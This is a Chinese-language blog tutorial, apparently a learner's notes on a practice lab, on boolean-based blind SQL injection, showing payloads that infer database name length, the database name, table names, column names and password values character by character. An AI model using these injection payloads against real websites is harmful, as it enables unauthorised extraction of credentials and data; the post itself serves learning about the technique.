---
title: SQL注入--布尔盲注
date: 2020-03-05 15:04:05
tags: SQL注入
categories: 技术
photos: http://pic.netbian.com/uploads/allimg/180413/121552-152359295246db.jpg
---



前不久又学习了sql注入的布尔盲注，现在总结一下。
**布尔盲注的前提：没有显示位，没有sql语句执行错误的信息（和联合查询就不同了）。只能通过页面返回正常不正常来判断是否存在注入。**

### 1.当然第一步还是判断闭合符号，这是基础。这都搞不了，下面就无法进行了。
### 2.第二部就是判断数据库的长度。
  我们需要知道这一函数   **1' and (length(database())=8)--+**，通过它来判断数据库的长度，当然=可以换成 >,<  ,但是无论怎么换我们都是要缩小数据库长度的范围，最终确定数据库的长度。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305204807114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305204830900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
上面输入8，页面返回正常；然而输入9就出现异常。从而就可以判断出数据库名称的长度为8。
### 3.判断数据库名。
我们要使用     **1' and (ascii(substr(database(),1,1))>97)--+**，来一一判断数据库的ascii值。最终得到数据库的名称。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200305210117120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020030521012519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
在上面输入114发现页面正常，115却页面不正常，从而判断出数据库第一个的开头的ascii值为115，也就是s。
我们需要了解相关的函数：
**length()返回字符串的长度
substr()截取字符串的字符
    database()，返回当前数据库名
    第一个1，表示截取字符串的起始位置。    第二个1，表示截取字符串长度    语句作用：判断第一个库第一个字符是什么
ascii()将字符串转换成其ASCII码**
把第一个1换成2，就会出现第二个字符的值。以此轮回，最终就会确定数据库的名称。
### 4.爆出表名。

```
?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>1 --+
```
同样也是通过ascii来一一判断出表名。通过修改 limit 0,1 来获取其他表名。
### 5.曝出列名。

```
?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))>1 --+
```
也是修改limit后面的值来爆出列名。
### 6.爆值。

```
?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))>1--+  
```
同上。
这个过程是非常漫长的。我们也有其他的方法进行盲注。用python脚本，和burp更加简单。
大佬博客[burp进行盲注](https://www.cnblogs.com/hackxf/p/8893245.html)
[布尔盲注](https://blog.csdn.net/weixin_40709439)
小白持续更新中！！！

